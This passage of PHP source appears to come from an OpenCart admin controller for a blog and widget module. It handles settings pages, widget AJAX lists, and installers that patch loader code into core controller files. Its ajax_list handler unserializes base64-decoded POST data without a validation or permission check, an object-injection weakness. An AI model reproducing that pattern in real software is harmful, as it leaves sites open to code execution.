		 $this->data['tab'] = $this->request->get['tab'];
		}


		if (file_exists(DIR_APPLICATION . 'view/stylesheet/seocmspro.css')) {
			$this->document->addStyle('view/stylesheet/seocmspro.css');
		}
		if (file_exists(DIR_APPLICATION . 'view/stylesheet/colpick.css')) {
			$this->document->addStyle('view/stylesheet/colpick.css');
		}

		if (file_exists(DIR_APPLICATION . 'view/javascript/blog/colpick/colpick.js')) {
			$this->document->addScript('view/javascript/blog/colpick/colpick.js');
		}
		if (!file_exists(DIR_APPLICATION . 'view/javascript/ckeditor/ckeditor.js')) {
			if (file_exists(DIR_APPLICATION . 'view/javascript/blog/ckeditor/ckeditor.js')) {
				$this->document->addScript('view/javascript/blog/ckeditor/ckeditor.js');
			}
		} else {
			$this->document->addScript('view/javascript/ckeditor/ckeditor.js');
		}

		if (file_exists(DIR_APPLICATION . 'view/javascript/jquery/tabs.js')) {
			$this->document->addScript('view/javascript/jquery/tabs.js');
		} else {
			if (file_exists(DIR_APPLICATION . 'view/javascript/blog/tabs/tabs.js')) {
				$this->document->addScript('view/javascript/blog/tabs/tabs.js');
			}
		}
		if (file_exists(DIR_APPLICATION . 'view/javascript/blog/seocmspro.js')) {
			$this->document->addScript('view/javascript/blog/seocmspro.js');
		}

		$this->data['agoo_widgets'] = iBlog::searchdir(DIR_APPLICATION . "controller/agoo", 'DIRS');

        foreach ($this->data['agoo_widgets'] as $nm => $agoo_widget) {
        		if (file_exists(DIR_APPLICATION . "controller/agoo/".$agoo_widget."/".$agoo_widget.".php")) {
	        		$this->control('agoo/'.$agoo_widget.'/'.$agoo_widget);
	        		$controller_agoo = 'controller_agoo_'.$agoo_widget.'_'.$agoo_widget;
	             	$this->data = $this->$controller_agoo->index($this->data);
        	}
        }


		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->cache->delete('blog');
			$this->cache->delete('record');
			$this->cache->delete('blogsrecord');
			$this->cache->delete('html');
			$this->add_fields();
			$this->model_setting_setting->editSetting('ascp_widgets', $this->request->post);
			$this->session->data['success'] = $this->language->get('text_success');

			if (SCP_VERSION < 2) {
				$this->redirect($this->url->link('module/blog/widgets', 'token=' . $this->session->data['token'], 'SSL'));
			}
		}

		if (isset($this->session->data['success'])) {
			$this->data['success'] = $this->session->data['success'];

			unset($this->session->data['success']);
		} else {
			$this->data['success'] = '';
		}


		$this->data['token'] = $this->session->data['token'];
		$this->data['heading_title'] = $this->language->get('heading_title');
		$this->data['text_enabled'] = $this->language->get('text_enabled');
		$this->data['text_disabled'] = $this->language->get('text_disabled');
		$this->data['text_content_top'] = $this->language->get('text_content_top');
		$this->data['text_content_bottom'] = $this->language->get('text_content_bottom');
		$this->data['text_column_left'] = $this->language->get('text_column_left');
		$this->data['text_column_right'] = $this->language->get('text_column_right');
		$this->data['text_what_blog'] = $this->language->get('text_what_blog');
		$this->data['text_what_list'] = $this->language->get('text_what_list');
		$this->data['text_what_all'] = $this->language->get('text_what_all');

		$this->data['entry_what'] = $this->language->get('entry_what');
		$this->data['entry_small_dim'] = $this->language->get('entry_small_dim');
		$this->data['entry_big_dim'] = $this->language->get('entry_big_dim');
		$this->data['entry_blog_num_comments'] = $this->language->get('entry_blog_num_comments');
		$this->data['entry_blog_num_records'] = $this->language->get('entry_blog_num_records');
		$this->data['entry_blog_num_desc'] = $this->language->get('entry_blog_num_desc');
		$this->data['entry_blog_num_desc_words'] = $this->language->get('entry_blog_num_desc_words');
		$this->data['entry_blog_num_desc_pred'] = $this->language->get('entry_blog_num_desc_pred');
		$this->data['entry_blog_template'] = $this->language->get('entry_blog_template');
		$this->data['entry_blog_template_record'] = $this->language->get('entry_blog_template_record');
		$this->data['tab_general'] = $this->language->get('tab_general');
		$this->data['tab_list'] = $this->language->get('tab_list');
		$this->data['entry_layout'] = $this->language->get('entry_layout');
		$this->data['entry_position'] = $this->language->get('entry_position');
		$this->data['entry_status'] = $this->language->get('entry_status');
		$this->data['entry_sort_order'] = $this->language->get('entry_sort_order');
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');
		$this->data['button_add_module'] = $this->language->get('button_add_module');
		$this->data['button_remove'] = $this->language->get('button_remove');
		$this->data['url_blog'] = $this->url->link('catalog/blog', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_record'] = $this->url->link('catalog/record', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_comment'] = $this->url->link('catalog/comment', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_create'] = $this->url->link('module/blog/createtables', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_modules'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_fields'] = $this->url->link('catalog/fields', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_modules_text'] = $this->language->get('url_modules_text');
		$this->data['url_blog_text'] = $this->language->get('url_blog_text');
		$this->data['url_record_text'] = $this->language->get('url_record_text');
		$this->data['url_comment_text'] = $this->language->get('url_comment_text');
		$this->data['url_create_text'] = $this->language->get('url_create_text');
		$this->data['url_options'] = $this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_schemes'] = $this->url->link('module/blog/schemes', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_url'] = $this->url->link('module/blog/url', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_widgets'] = $this->url->link('module/blog/widgets', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['action'] = $this->url->link('module/blog/widgets', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['cancel'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');

		$this->load->model('setting/store');
		$this->data['stores'] = $this->model_setting_store->getStores();

		$this->load->model('localisation/language');
		$this->data['languages'] = $this->model_localisation_language->getLanguages();
		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		$this->data['breadcrumbs'] = array();
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_home'),
			'href' => $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => false
		);
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_module'),
			'href' => $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => ' :: '
		);
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('heading_title'),
			'href' => $this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => ' / '
		);





		$this->data['widget_list'] = Array();

		foreach ($this->data['agoo_widgets'] as $num =>$widget_name) {

		 if (!isset($this->data['widget_list'][$widget_name]))	 {
            array_push($this->data['widget_list'],$widget_name);
		 }
		}

		if (isset($this->request->post['ascp_widgets'])) {
			$this->data['ascp_widgets'] = $this->request->post['ascp_widgets'];
		} else {
			$this->data['ascp_widgets'] = $this->config->get('ascp_widgets');
		}


		if (count($this->data['ascp_widgets']) > 0) {
			ksort($this->data['ascp_widgets']);
		}
		$this->data['modules'] = array();
		if (isset($this->request->post['blog_module'])) {
			$this->data['modules'] = $this->request->post['blog_module'];
		} elseif ($this->config->get('blog_module')) {
			$this->data['modules'] = $this->config->get('blog_module');
		}
		$this->load->model('design/layout');
		$this->data['layouts'] = $this->model_design_layout->getLayouts();

       $this->cont('agooa/adminmenu');
       $this->data['agoo_menu'] = $this->controller_agooa_adminmenu->index();

		$this->template = 'module/blog_widgets.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);

		$this->data['blog_version'] = $this->data['blog_version']. ' '. $this->data['blog_version_model'];
		$this->data['registry'] = $this->registry;
		$this->data['language'] =  $this->language;
		$this->data['config'] 	=  $this->config;

        if (SCP_VERSION < 2) {
			$this->data['column_left'] ='';
			$html = $this->render();
		}
		$this->response->setOutput($html);
	}


/***************************************/

	public function ajax_list()
	{
        $ver = VERSION;
 		if (!defined('SCP_VERSION')) define('SCP_VERSION', $ver[0]);

		$this->data['token'] = $this->session->data['token'];
		$this->language->load('module/blog');
		$this->data['text_enabled'] = $this->language->get('text_enabled');
		$this->data['text_disabled'] = $this->language->get('text_disabled');
		$this->data['entry_avatar_dim'] = $this->language->get('entry_avatar_dim');
        $this->data['url_fields'] = $this->url->link('catalog/fields', 'token=' . $this->session->data['token'], 'SSL');

 	  	$this->data['button_save'] = $this->language->get('button_save');

		$this->load->model('catalog/blog');
		$this->load->model('catalog/category');
		$this->load->model('localisation/language');

		if (file_exists(DIR_APPLICATION . 'view/stylesheet/colpick.css')) {
			$this->document->addStyle('view/stylesheet/colpick.css');
		}
		if (file_exists(DIR_APPLICATION . 'view/javascript/blog/colpick/colpick.js')) {
			$this->document->addScript('view/javascript/blog/colpick/colpick.js');
		}

		$this->load->model('setting/store');
		$this->data['stores'] = $this->model_setting_store->getStores();

		$this->load->model('sale/customer_group');
		$this->data['customer_groups'] = $this->model_sale_customer_group->getCustomerGroups();


       array_push($this->data['customer_groups'], array( 'customer_group_id' => -1,  'name' => $this->language->get('text_group_reg') ));
       array_push($this->data['customer_groups'], array( 'customer_group_id' => -2,  'name' => $this->language->get('text_group_order') ));
       array_push($this->data['customer_groups'], array( 'customer_group_id' => -3,  'name' => $this->language->get('text_group_order_this')));

         $this->data['customer_groups_avatar'] = $this->data['customer_groups'];


        $this->load->model('setting/setting');
        // second parametr  - store_id
		$store_info = $this->model_setting_setting->getSetting('config', 0);
        if (isset($store_info['config_email'])) {
        	$this->data['config_email'] = $store_info['config_email'];
        } else {
          	$this->data['config_email'] = '';
        }

		$this->data['languages'] = $this->model_localisation_language->getLanguages();
		if (isset($this->request->post['list'])) {
			$str = base64_decode($this->request->post['list']);
			$list = unserialize($str);
		} else {
			$list = Array();
		}
		if (isset($this->request->post['num'])) {
			$num = $this->request->post['num'];
		}

        $this->data['id'] = $num;
		$this->data['ascp_widgets'][$this->data['id']] = $list;
		if (isset($this->request->post['type'])) {
			$this->data['ascp_widgets'][$this->data['id']]['type'] = $this->request->post['type'];
		}

        $this->data['fields_info'] = $this->getFields();
        require_once(DIR_SYSTEM . 'library/iblog.php');
		$this->data['agoo_widgets'] = iBlog::searchdir(DIR_APPLICATION . "controller/agoo", 'DIRS');

        foreach ($this->data['agoo_widgets'] as $nm => $agoo_widget) {
        	if ($this->data['ascp_widgets'][$this->data['id']]['type'] == $agoo_widget) {
        		if (file_exists(DIR_APPLICATION . "controller/agoo/".$agoo_widget."/".$agoo_widget.".php")) {
	        		$this->control('agoo/'.$agoo_widget.'/'.$agoo_widget);
	        		$controller_agoo = 'controller_agoo_'.$agoo_widget.'_'.$agoo_widget;
	             	$this->data = $this->$controller_agoo->index($this->data);
	             	if (isset($this->data[$agoo_widget.'_template'])) {
	             		$this->template = $this->data[$agoo_widget.'_template'];
	             	}
             	}
        	}
        }


/*************************************************************************************/
		if (isset($this->data['ascp_widgets'][$this->data['id']]['anchor']) && $this->data['ascp_widgets'][$this->data['id']]['anchor']!='' && $this->data['ascp_widgets'][$this->data['id']]['type'] != 'avatar') {
       	 	$pos = strpos(str_replace(' ', '',$this->data['ascp_widgets'][$this->data['id']]['anchor']), str_replace(' ', '',"$('#cmswidget-'+cmswidget).remove()"));

			if ($pos === false) {
				   $this->data['ascp_widgets'][$this->data['id']]['anchor'] = "$('#cmswidget-'+cmswidget).remove();
". $this->data['ascp_widgets'][$this->data['id']]['anchor'];
			}
		}


		if (isset($this->data['ascp_widgets'][$this->data['id']]['anchor']) && $this->data['ascp_widgets'][$this->data['id']]['anchor']!='' && $this->data['ascp_widgets'][$this->data['id']]['type'] != 'avatar') {
       	 	$pos = strpos(str_replace(' ', '',$this->data['ascp_widgets'][$this->data['id']]['anchor']), str_replace(' ', '','$(data).html()'));

			if ($pos === false) {
				   $this->data['ascp_widgets'][$this->data['id']]['anchor'] = 'data = $(data).html();
'. $this->data['ascp_widgets'][$this->data['id']]['anchor'];
			}
		}
/*************************************************************************************/
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['rating'])) {
			$this->data['ascp_widgets'][$this->data['id']]['rating'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['counting'])) {
			$this->data['ascp_widgets'][$this->data['id']]['counting'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_date'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_date'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_rating'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_rating'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['number_comments'])) {
			$this->data['ascp_widgets'][$this->data['id']]['number_comments'] = 20;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['status'])) {
			$this->data['ascp_widgets'][$this->data['id']]['status'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['status_language'])) {
			$this->data['ascp_widgets'][$this->data['id']]['status_language'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['visual_rating'])) {
			$this->data['ascp_widgets'][$this->data['id']]['visual_rating'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['signer'])) {
			$this->data['ascp_widgets'][$this->data['id']]['signer'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['visual_editor'])) {
			$this->data['ascp_widgets'][$this->data['id']]['visual_editor'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['description_status'])) {
			$this->data['ascp_widgets'][$this->data['id']]['description_status'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['avatar_status'])) {
			$this->data['ascp_widgets'][$this->data['id']]['avatar_status'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['title_status'])) {
			$this->data['ascp_widgets'][$this->data['id']]['title_status'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['cached'])) {
			$this->data['ascp_widgets'][$this->data['id']]['cached'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['images_view'])) {
			$this->data['ascp_widgets'][$this->data['id']]['images_view'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_comments'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_comments'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['karma'])) {
			$this->data['ascp_widgets'][$this->data['id']]['karma'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['fields_view'])) {
			$this->data['ascp_widgets'][$this->data['id']]['fields_view'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_captcha'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_captcha'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['status_now'])) {
			$this->data['ascp_widgets'][$this->data['id']]['status_now'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_category'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_category'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_record'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_record'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_avatar'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_avatar'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['view_author'])) {
			$this->data['ascp_widgets'][$this->data['id']]['view_author'] = true;
		}
		if (!isset($this->data['ascp_widgets'][$this->data['id']]['field_public'])) {
			$this->data['ascp_widgets'][$this->data['id']]['field_public'] = true;
		}
/*************************************************************************************/


		if (count($this->data['ascp_widgets']) > 0) {
			reset($this->data['ascp_widgets']);
			$first_key = key($this->data['ascp_widgets']);
			foreach ($this->data['ascp_widgets'] as $num => $list) {
				$this->data['slist'] = serialize($list);
			}
		}

		$this->data['registry'] = $this->registry;
		$this->data['language'] =  $this->language;
		$this->data['config'] 	=  $this->config;

        if (SCP_VERSION < 2) {
			$this->data['column_left'] ='';
			$html = $this->render();
		}
		$this->response->setOutput($html);
	}

/***************************************/
	private function install_new_loader()
	{
        $ver = VERSION;
 		if (!defined('SCP_VERSION')) define('SCP_VERSION', $ver[0]);
		$this->install_front_loader();
		$this->install_back_loader();
	}

	private function install_front_loader()
	{
		$html = '';
		$file = DIR_CATALOG . 'controller/common/maintenance.php';
		$admin_url = $this->http_catalog();
		$content_maintenance = file_get_contents($file, FILE_USE_INCLUDE_PATH);
		$findme = "seocmspro_loader";
		$pos = strpos($content_maintenance, $findme);
		if ($pos === false) {
			$text = "
\$seocmspro_loader='begin';
\$file = DIR_SYSTEM . 'library/front_loader.php';
if (file_exists(\$file)) {include_once(\$file);}
\$seocmspro_loader='end';";

			$end_file = substr($content_maintenance,strlen($content_maintenance)-2,strlen($content_maintenance)-1);

			if ($end_file == '?>') {
           	 $content_maintenance = substr($content_maintenance, 0,strlen($content_maintenance)-2);
			}

            $text_write = $content_maintenance.$text;

			$this->dir_permissions($file);
			if (file_exists($file)) {
				if (is_writable($file)) {
					$f = @fopen($file, 'w');
					@fwrite($f, $text_write);
					@fclose($f);
					$html .= $this->language->get('ok_777'). '<br>';
				} else {
					$html .= $file."<br>".$this->language->get('access_777') . "<br>";
				}
			}
		}
		return $html;
	}


	private function install_back_loader()
	{
		$html = '';
		if (SCP_VERSION < 2) {
			$file = DIR_APPLICATION . 'controller/common/home.php';
		}
		$admin_url = $this->http_catalog();
		$content_maintenance = file_get_contents($file, FILE_USE_INCLUDE_PATH);
		$findme = "seocmspro_loader";
		$pos = strpos($content_maintenance, $findme);
		if ($pos === false) {
			$text = "
\$seocmspro_loader='begin';
\$file = DIR_SYSTEM.'library/front_loader.php';
if (!isset(\$registry)) {\$registry = \$this->registry;}
if (!class_exists('User')) {
require_once(DIR_SYSTEM . 'library/user.php');
}
\$user =  new User(\$registry);
if (\$user->isLogged()) {
	\$registry->set('admin_work', true);
	if (file_exists(\$file)) {include_once(\$file);}
}
\$seocmspro_loader='end';";

			$end_file = substr($content_maintenance,strlen($content_maintenance)-2,strlen($content_maintenance)-1);

			if ($end_file == '?>') {
           	 $content_maintenance = substr($content_maintenance, 0,strlen($content_maintenance)-2);
			}

            $text = $content_maintenance.$text;

			$this->dir_permissions($file);
			if (file_exists($file)) {
				if (is_writable($file)) {
					$f = @fopen($file, 'w');
					@fwrite($f, $text);
					@fclose($f);
					$html .= $this->language->get('ok_777'). '<br>';
				} else {
					$html .= $file."<br>".$this->language->get('access_777') . "<br>";
				}
			}
		}
		return $html;
	}
/***************************************/
	private function remove_old_loader()
	{
		$this->remove_back_old_loader();
		$this->remove_front_old_loader();

	}
	private function remove_back_old_loader()
	{
		$html = "<br>";
		$this->load->model('localisation/language');
		$languages = $this->model_localisation_language->getLanguages();
		foreach ($languages as $language) {
			if ($this->config->get('config_language') == $language['code']) {
				$directory = $language['directory'];
			}
		}
		$file = DIR_LANGUAGE . $directory . '/common/footer.php';
		$this->dir_permissions($file);
		if (file_exists($file)) {
			$text = file_get_contents($file, FILE_USE_INCLUDE_PATH);
			$this->dir_permissions($file);
			$text = preg_replace("!<[\?]php [\$]loader_version(.*?)[\?]>!s", "", $text);
			if (is_writable($file)) {
				$f = @fopen($file, 'w');
				@fwrite($f, $text);
				@fclose($f);
				$html .= $this->language->get('remove_777'). '<br>';
			} else {
				$html .= $file . "<br>" . $this->language->get('access_777') . "<br>";
			}
		}

		$file = DIR_APPLICATION . 'controller/common/home.php';
		if (file_exists($file)) {
			$text = file_get_contents($file, FILE_USE_INCLUDE_PATH);
			$this->dir_permissions($file);
			$text = preg_replace("!<[\?]php [\$]occms_version(.*?)[\?]>!s", "", $text);
			if (is_writable($file)) {
				$f = @fopen($file, 'w');
				@fwrite($f, $text);
				@fclose($f);
				$html .= $this->language->get('remove_777'). '<br>';
			} else {
				$html .= $file . "<br>" . $this->language->get('access_777') . "<br>";
			}
		}
		return $html;
	}

	private function remove_front_old_loader()
	{
		$html = "<br>";
		$file = DIR_CATALOG . 'controller/common/maintenance.php';
		if (file_exists($file)) {
			$text = file_get_contents($file, FILE_USE_INCLUDE_PATH);
			$this->dir_permissions($file);
			$text = preg_replace("!<[\?]php [\$]occms_version(.*?)[\?]>!s", "", $text);
			if (is_writable($file)) {
				$f = @fopen($file, 'w');
				@fwrite($f, $text);
				@fclose($f);
				$html .= $this->language->get('remove_777'). '<br>';
			} else {
				$html .= $file . "<br>" . $this->language->get('access_777') . "<br>";
			}
		}

		if (VERSION == '1.5.5.1') {
			$file = DIR_CATALOG . 'controller/error/not_found.php';
			if (file_exists($file)) {
				$text = file_get_contents($file, FILE_USE_INCLUDE_PATH);
				$this->dir_permissions($file);
				$text = preg_replace("!<[\?]php [\$]occms_version(.*?)[\?]>!s", "", $text);
				if (is_writable($file)) {
					$f = @fopen($file, 'w');
					@fwrite($f, $text);
					@fclose($f);
					$html .= $this->language->get('remove_777'). '<br>';
				} else {
					$html .= $file . "<br>" . $this->language->get('access_777') . "<br>";
				}
			}
		}
		return $html;
	}
/***************************************/


/***************************************/
	private function remove_new_loader()
	{
		$this->remove_front_loader();
		$this->remove_back_loader();
	}


/***************************************/
	private function remove_front_loader()
	{
		$html = "<br>";
		$file = DIR_CATALOG . 'controller/common/maintenance.php';
		if (file_exists($file)) {
			$text = file_get_contents($file, FILE_USE_INCLUDE_PATH);
			$this->dir_permissions($file);
			$text = preg_replace("![\$]seocmspro_loader[\=][\']begin[\'][\;](.*?)[\$]seocmspro_loader[\=][\']end[\'][\;]!s", "", $text);
			if (is_writable($file)) {
				$f = @fopen($file, 'w');
				@fwrite($f, $text);
				@fclose($f);
				$html .= $this->language->get('remove_777'). '<br>';
			} else {
				$html .= $file . "<br>" . $this->language->get('access_777') . "<br>";
			}
		}
		return $html;
	}
/***************************************/
 	private function remove_back_loader()
	{
		$html = "<br>";
		$file = DIR_APPLICATION . 'controller/common/home.php';
		if (file_exists($file)) {
			$text = file_get_contents($file, FILE_USE_INCLUDE_PATH);
			$this->dir_permissions($file);
			$text = preg_replace("![\$]seocmspro_loader[\=][\']begin[\'][\;](.*?)[\$]seocmspro_loader[\=][\']end[\'][\;]!s", "", $text);
			if (is_writable($file)) {
				$f = @fopen($file, 'w');
				@fwrite($f, $text);
				@fclose($f);
				$html .= $this->language->get('remove_777'). '<br>';
			} else {
				$html .= $file . "<br>" . $this->language->get('access_777') . "<br>";
			}
		}

		return $html;
	}



	public function uninstall()
	{
		$this->remove_front_loader();
		$this->remove_back_loader();
	}
/***************************************/
	public function install()
	{
		$this->createTables();
	}
/***************************************/
	public function ascp_widgets_save()
	{
 	  $this->load->model('setting/setting');

		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {

		 $this->data['token'] = $this->session->data['token'];

		  $ascp_widgets = $this->config->get('ascp_widgets');

		  if (isset($this->request->post['ascp_widgets'])) {
		    $ascp_widgets_post = $this->request->post['ascp_widgets'];
		  } else {
		  	$ascp_widgets_post = Array();
		  }

		if ($this->config->get('blog_module')) {
			$modules = $this->config->get('blog_module');
		} else {
		    $modules = Array();
		}

      foreach ($ascp_widgets as $un => $lav) {
      	 if ($un=='' || !isset($un)) {
      	 	unset($ascp_widgets[$un]);
      	 }

      }

	    $zamena = array ("`", "'", '"', "<", ">");
		foreach ($ascp_widgets_post as $num => $val) {
				if (isset($val['title_list_latest']) && !empty($val['title_list_latest'])) {
					foreach ($val['title_list_latest'] as $num_1 => $val_1) {
					 $ascp_widgets_post[$num]['title_list_latest'][$num_1] = str_replace($zamena,"",$val_1);
					}
				}
  		}

         $ascp_widgets[key($ascp_widgets_post)] = $ascp_widgets_post[key($ascp_widgets_post)];

         if (isset($ascp_widgets_post[key($ascp_widgets_post)]['remove']) && $ascp_widgets_post[key($ascp_widgets_post)]['remove']=="remove") {
           unset($ascp_widgets[key($ascp_widgets_post)]);

           foreach ($modules as $num => $value) {
           	if (isset($value['what']) && $value['what'] == key($ascp_widgets_post)) {
           	 unset($modules[$num]);
           	 $modules_new['blog_module'] = $modules;
           	 $this->model_setting_setting->editSetting('blog_module', $modules_new);
           	}

           }

         }

	     $ascp_widgets_new['ascp_widgets'] = $ascp_widgets;

		 $this->model_setting_setting->editSetting('ascp_widgets', $ascp_widgets_new);


		}


	}

	private function getFields() {
			$fields       = array();
			$this->load->model('catalog/fields');
			$fields  = $this->model_catalog_fields->getFieldsDesc();
            return $fields;
	}


/***************************************/
	public function autocomplete_template()
	{
		$json = array();
		if (isset($this->request->get['path'])) {
			if (isset($this->request->get['path'])) {
				$path = $this->request->get['path'];
			} else {
				$path = '';
			}
			$this->data['this'] = $this;
			$this->data['widgets_full_path_default'] = array();
			$this->data['widgets_full_path_theme'] = array();
			$this->data['widgets_full_path_default'] = $this->msearchdir(DIR_CATALOG . "view/theme/default/template/agootemplates/" . $path);
			$this->data['widgets_full_path_theme'] = $this->msearchdir(DIR_CATALOG . "view/theme/" . $this->config->get('config_template') . "/template/agootemplates/" . $path);
			$this->data['widgets_full_path'] = array_replace_recursive($this->data['widgets_full_path_default'], $this->data['widgets_full_path_theme']);
			$i = 0;
            $this->data['widgets']=Array('');
			foreach ($this->data['widgets_full_path'] as $widget_full_path) {
				$dname = str_replace(DIR_CATALOG . "view/theme/default/template/agootemplates/" . $path . "/", '', $widget_full_path);
				$ename = str_replace(DIR_CATALOG . "view/theme/" . $this->config->get('config_template') . "/template/agootemplates/" . $path . "/", '', $dname);
				$this->data['widgets'][$i]['name'] = $ename;
				$i++;
			}

			foreach ($this->data['widgets'] as $result) {
				$json[] = array(
					'name' => strip_tags(html_entity_decode($result['name'], ENT_QUOTES, 'UTF-8'))
				);
			}
		}
		$this->response->setOutput(json_encode($json));
	}
/***************************************/
	public function msearchdir($path, $mode = "FULL", $myself = false, $maxdepth = -1, $d = 0)
	{
		$dirlist = array();
		if (!file_exists($path)) {
			return $dirlist;
		}
		if (substr($path, strlen($path) - 1) != '/') {
			$path .= '/';
		}
		if ($mode != "FILES") {
			if ($d != 0 || $myself)
				$dirlist[] = $path;
		}
		if ($handle = opendir($path)) {
			while (false !== ($file = readdir($handle))) {
				if ($file != '.' && $file != '..') {
					$file = $path . $file;
					if (!is_dir($file)) {
						if ($mode != "DIRS") {
							$dirlist[] = $file;
						}
					} elseif ($d >= 0 && ($d < $maxdepth || $maxdepth < 0)) {
						$result = $this->msearchdir($file . '/', $mode, $myself, $maxdepth, $d + 1);
						$dirlist = array_merge($dirlist, $result);
					}
				}
			}
			closedir($handle);
		}
		if ($d == 0) {
			natcasesort($dirlist);
		}
		return ($dirlist);
	}
/***************************************/
	private function add_fields($prefix = '')
	{
		if (isset($this->request->post['ascp_widgets'])) {
			foreach ($this->request->post['ascp_widgets'] as $num => $value) {
				if (isset($value['addfields'])) {
					$sql[0] = "
						CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "review_fields` (
							 `review_id` int(11) NOT NULL,
					  		KEY `review_id` (`review_id`)
						) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
						";
					foreach ($sql as $qsql) {
						$query = $this->db->query($qsql);
					}
					foreach ($value['addfields'] as $num_add => $value_add) {
						if ($value_add['field_name'] != '') {
							$r = $this->db->query("DESCRIBE " . DB_PREFIX . "review_fields '" . $prefix . $value_add['field_name'] . "'");
							if ($r->num_rows == 0) {
								$msql = "ALTER TABLE `" . DB_PREFIX . "review_fields` ADD `" . $prefix . $value_add['field_name'] . "` text COLLATE utf8_general_ci NOT NULL";
								$query = $this->db->query($msql);
							}
						}
					}
				}
			}
		}
	}
/***************************************/
	private function validate()
	{
		$this->language->load('module/blog');
		if (!$this->user->hasPermission('modify', 'module/blog')) {
			$this->error['warning'] = $this->language->get('error_permission');
		}
		if (isset($this->request->post['ascp_widgets'])) {
			foreach ($this->request->post['ascp_widgets'] as $num => $value) {
				if (isset($value['addfields']) && !empty($value['addfields'])) {
					foreach ($value['addfields'] as $num_add => $value_add) {
						if ($value_add['field_name'] == '') {
							$this->error['warning'] = $this->language->get('error_addfields_name');
						} else {
							if (!preg_match('/^[a-z][a-z0-9-_]{3,30}$/i', $value_add['field_name'])) {
								$this->error['warning'] = $this->language->get('error_addfields_name');
							}
						}
					}
				}
			}
		}
		if (!$this->error) {
			return true;
		} else {
			$this->request->post = array();
			return false;
		}
	}
/***************************************/
	public function browser()
	{
		$bra = 'ie';
		if (stristr($_SERVER['HTTP_USER_AGENT'], 'Firefox'))
			$bra = 'firefox';
		elseif (stristr($_SERVER['HTTP_USER_AGENT'], 'Chrome'))
			$bra = 'chrome';
		elseif (stristr($_SERVER['HTTP_USER_AGENT'], 'Safari'))
			$bra = 'safari';
		elseif (stristr($_SERVER['HTTP_USER_AGENT'], 'Opera'))
			$bra = 'opera';
		elseif (stristr($_SERVER['HTTP_USER_AGENT'], 'MSIE 6.0'))
			$bra = 'ieO';
		elseif (stristr($_SERVER['HTTP_USER_AGENT'], 'MSIE 7.0'))
			$bra = 'ieO';
		elseif (stristr($_SERVER['HTTP_USER_AGENT'], 'MSIE 8.0'))
			$bra = 'ieO';
		return $bra;
	}
/***************************************/
	private function http_catalog()
	{
		if (!defined('HTTPS_CATALOG')) {
			$https_catalog = HTTP_CATALOG;
		} else {
			$https_catalog = HTTPS_CATALOG;
		}
		if (isset($this->request->server['HTTPS']) && (($this->request->server['HTTPS'] == 'on') || ($this->request->server['HTTPS'] == '1'))) {
			return $https_catalog;
		} else {
			return HTTP_CATALOG;
		}
	}

/***************************************/
	public function cont($cont)
	{
		$file  = DIR_CATALOG . 'controller/' . $cont . '.php';
		if (file_exists($file)) {
           $this->cont_loading($cont, $file);
           return true;
		} else {
